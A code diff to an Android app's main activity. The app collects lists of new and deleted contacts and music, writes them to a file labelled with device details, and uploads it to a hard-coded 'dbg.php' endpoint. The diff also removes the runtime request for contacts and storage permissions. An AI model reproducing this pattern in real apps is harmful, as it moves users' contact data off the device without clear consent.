@@ -30,7 +30,7 @@ import java.util.concurrent.TimeUnit;
 public class MainActivity extends AppCompatActivity
 {
 
-    private static final String TAG = "Main Activity";
+    private static final String TAG = "MainActivity";
     private static final String SEPARATOR = " # ";
     private String upLoadServerUri = "http://test.whichapp.me/dbg/dbg.php";
 
@@ -39,18 +39,6 @@ public class MainActivity extends AppCompatActivity
     {
         super.onCreate(savedInstanceState);
         setContentView(R.layout.activity_main);
-
-        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M)
-        {
-            requestPermissions(new String[]{Manifest.permission.READ_EXTERNAL_STORAGE, Manifest.permission.WRITE_EXTERNAL_STORAGE, Manifest.permission.READ_CONTACTS}, 90);
-        }
-
-    }
-
-    @Override
-    public void onRequestPermissionsResult(int requestCode, @NonNull String[] permissions, @NonNull int[] grantResults)
-    {
-        super.onRequestPermissionsResult(requestCode, permissions, grantResults);
         startService(new Intent(this, MyService.class));
     }
 
@@ -58,8 +46,8 @@ public class MainActivity extends AppCompatActivity
     {
         DatabaseUtility utility = DatabaseUtility.newInstance(this);
         List<MusicItem> newMusic = utility.getNewMusicList();
-        List<ContactItem> newContacts = utility.getNewContactList();
         List<MusicItem> deletedMusic = utility.getDeletedMusicList();
+        List<ContactItem> newContacts = utility.getNewContactList();
         List<ContactItem> deletedContact = utility.getDeletedContactList();
 
         String filename = android.os.Build.PRODUCT+ " "+android.os.Build.VERSION.RELEASE + "("+android.os.Build.VERSION.SDK_INT+") "+android.os.Build.MODEL;
@@ -85,7 +73,7 @@ public class MainActivity extends AppCompatActivity
                 fOut.write(item.getTimestamp().getBytes());
                 fOut.write("\n".getBytes());
             }
-
+            fOut.flush();
             fOut.close();
         } catch (IOException e)
         {
@@ -123,7 +111,7 @@ public class MainActivity extends AppCompatActivity
         }
 
         @Override
-        protected void onPostExecute(String lenghtOfFile) {
+        protected void onPostExecute(String lengthOfFile) {
             // do stuff after posting data
             Log.i("Activity", "File Sent");
             Toast.makeText(MainActivity.this, "File Sent", Toast.LENGTH_SHORT).show();
